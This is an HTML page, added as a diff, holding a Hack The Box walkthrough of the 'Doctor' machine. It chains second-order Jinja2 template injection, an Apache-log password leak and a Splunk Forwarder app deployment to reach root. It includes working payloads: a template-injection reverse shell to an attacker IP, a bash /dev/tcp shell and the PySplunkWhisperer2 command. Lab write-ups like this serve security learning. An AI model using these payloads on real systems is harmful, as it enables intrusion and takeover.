@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Doctor — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🩺</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='doctor'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-doc','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}};if(sessionStorage.getItem('htb-auth-doc')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Doctor</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80 · 8089</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Jinja2 SSTI (second-order) → web shell</span><span class="chain-arrow">→</span><span class="chain-node blue">Apache log password leak → su shaun</span><span class="chain-arrow">→</span><span class="chain-node red">Splunk Forwarder malicious app → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.2.21</span>
+<span class="output">PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http     Apache httpd 2.4.41
+<span class="highlight">8089/tcp open  ssl/http Splunkd httpd (build 8.0.5)</span></span></code></pre>
+
+<h3>Virtual Host Discovery</h3>
+<p>The page at <code>http://10.129.2.21</code> shows a static medical site. An email address <code>info@doctors.htb</code> hints at a vhost:</p>
+
+<pre><code><span class="cmd">$ echo "10.129.2.21 doctors.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+<p><code>http://doctors.htb</code> serves a completely different application — <strong>Doctor Secure Messaging</strong> built on Flask/Werkzeug/Python 3.8.2, with a login and registration page.</p>
+
+<pre><code><span class="cmd">$ gobuster dir -u http://doctors.htb -w /usr/share/wordlists/dirb/big.txt -x txt</span>
+<span class="output"><span class="highlight">/archive</span>   (Status: 200)   ← hidden in HTML comments too</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Second-Order Jinja2 SSTI</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">Why this SSTI is uniquely stealthy</span>
+The injection point is the post <strong>title</strong> field at <code>/post/new</code>. But the execution happens on a completely different page — <code>/archive</code>. Even there, the output is invisible in the rendered page; it only appears in the <strong>HTML source code</strong> (Ctrl+U). This is a textbook <strong>second-order injection</strong>: input in one place, execution in another, visible only in raw source.
+</div>
+
+<h3>Confirm SSTI</h3>
+<p>Register an account, create a new post with title <code>{{7*'7'}}</code>, then view source of <code>/archive</code>:</p>
+
+<pre><code><span class="output">&lt;item&gt;&lt;title&gt;<span class="highlight">7777777</span>&lt;/title&gt;&lt;/item&gt;</span></code></pre>
+
+<p><code>7*'7'</code> = string repeated 7 times = Jinja2 confirmed (Twig would output <code>49</code>).</p>
+
+<h3>Template Engine Identification Decision Tree</h3>
+<pre><code><span class="output">${7*7}
+├── works → a{*comment*}b
+│   ├── works → <span class="highlight">Smarty</span>
+│   └── nope  → ${"z".join("ab")}
+│       ├── works → <span class="highlight">Mako</span>
+│       └── nope  → Unknown
+└── nope  → {{7*7}}
+    ├── works → {{7*'7'}}
+    │   ├── 7777777 → <span class="highlight">Jinja2</span>  ← this machine
+    │   └── 49      → <span class="highlight">Twig</span>
+    └── nope  → Not vulnerable</span></code></pre>
+
+<h3>Reverse Shell via Class Traversal</h3>
+<pre><code><span class="comment"># Post title payload — traverses Python class hierarchy to find warnings module</span>
+<span class="output">{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.15.65\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{% endif %}{% endfor %}</span></code></pre>
+
+<p>Publish the post, then refresh <code>view-source:http://doctors.htb/archive</code> to trigger execution.</p>
+
+<pre><code><span class="cmd">$ nc -lnvp 4444</span>
+<span class="output">web@doctor:~$</span></code></pre>
+
+<h3>Vulnerable Code</h3>
+<pre><code><span class="comment"># /home/web/blog/flaskblog/main/routes.py</span>
+<span class="output">@main.route("/archive")
+def feed():
+    posts = Post.query.order_by(Post.date_posted.asc())
+    tpl = '&lt;?xml ...&gt;&lt;rss&gt;&lt;channel&gt;&lt;title&gt;Archive&lt;/title&gt;'
+    for post in posts:
+        tpl += "&lt;item&gt;&lt;title&gt;"+<span class="important">post.title</span>+"&lt;/title&gt;&lt;/item&gt;\n"
+    return <span class="important">render_template_string(tpl)</span>  <span class="comment"># ← user input in template!</span></span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">20-minute timer</span>
+A cron job (<code>*/20 * * * * /opt/clean/cleandb.py</code>) wipes all accounts and posts every 20 minutes. Work fast after registering — if your posts disappear, re-register and re-inject.
+</div>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — Apache Log Password Leak</h2></div>
+
+<pre><code><span class="cmd">web@doctor:~$ groups</span>
+<span class="output">web <span class="highlight">adm</span></span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">adm group = log access</span>
+The <code>adm</code> group grants read access to <code>/var/log</code>. Logs often contain accidentally submitted credentials — form data, debug output, failed authentication attempts with passwords in the wrong field.
+</div>
+
+<pre><code><span class="cmd">web@doctor:/var/log/apache2$ grep -ri passw backup</span>
+<span class="output">10.10.14.4 - - "POST /reset_password?email=<span class="highlight">Guitar123</span>" 500 453</span></code></pre>
+
+<p>Someone typed their password (<code>Guitar123</code>) into the email field during a password reset. Apache logged the full URL including the query string.</p>
+
+<pre><code><span class="cmd">web@doctor:~$ su shaun</span>
+<span class="output">Password: Guitar123</span>
+
+<span class="cmd">shaun@doctor:~$ cat user.txt</span>
+<span class="output">4c9c97964e15b126d31f3d1c12175685</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — Splunk Forwarder Malicious App Deployment</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">Splunk Forwarder as a root shell launcher</span>
+Splunk Universal Forwarder runs as <strong>root</strong> and accepts "app" deployments via its management port (8089). An "app" can include scripts that execute with Splunk's privileges. With valid credentials, <code>SplunkWhisperer2</code> deploys a fake app containing a reverse shell script — Splunk dutifully runs it as root.
+</div>
+
+<pre><code><span class="cmd">$ python3 PySplunkWhisperer2_remote.py \
+  --host 10.129.2.21 \
+  --lhost 10.10.15.65 \
+  --username shaun \
+  --password Guitar123 \
+  --payload "bash -c 'bash -i >& /dev/tcp/10.10.15.65/5555 0>&1'"</span></code></pre>
+
+<pre><code><span class="cmd">$ nc -lnvp 5555</span>
+<span class="output">root@doctor:/# cat /root/root.txt
+97cf0cfb1d031d39466b29e14cfbe909</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Second-order SSTI requires checking all output locations.</strong><p>The injection was in post titles, but execution happened in <code>/archive</code>'s source code. Always enumerate all routes and check raw HTML source — not just rendered pages.</p></div>
+<div class="takeaway-item"><strong>Template engine fingerprinting follows a decision tree.</strong><p><code>{{7*'7'}}</code> = <code>7777777</code> → Jinja2. <code>= 49</code> → Twig. Memorize the tree — it saves time on every SSTI test.</p></div>
+<div class="takeaway-item"><strong>The <code>adm</code> group is a privilege escalation goldmine.</strong><p>It grants read access to all system logs. <code>grep -ri passw /var/log/</code> should be your first command after discovering adm membership.</p></div>
+<div class="takeaway-item"><strong>Splunk Forwarder 8089 + valid credentials = instant root.</strong><p>SplunkWhisperer2 automates the entire attack: deploy fake app → script runs as root → shell. Any exposed Splunk management port with guessable credentials is game over.</p></div>
+<div class="takeaway-item"><strong>Email addresses on web pages hint at virtual hosts.</strong><p><code>info@doctors.htb</code> revealed a completely different application on the same IP. Always try domain names found in page content as vhost candidates.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">vhost discovery</span><span class="arrow">→</span><span class="node node-green">SSTI in /archive</span><span class="arrow">→</span><span class="node node-green">web shell</span><span class="arrow">→</span><span class="node node-blue">log leak → shaun</span><span class="arrow">→</span><span class="node node-red">Splunk app → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Doctor Writeup · 2026</footer>
+</body></html>
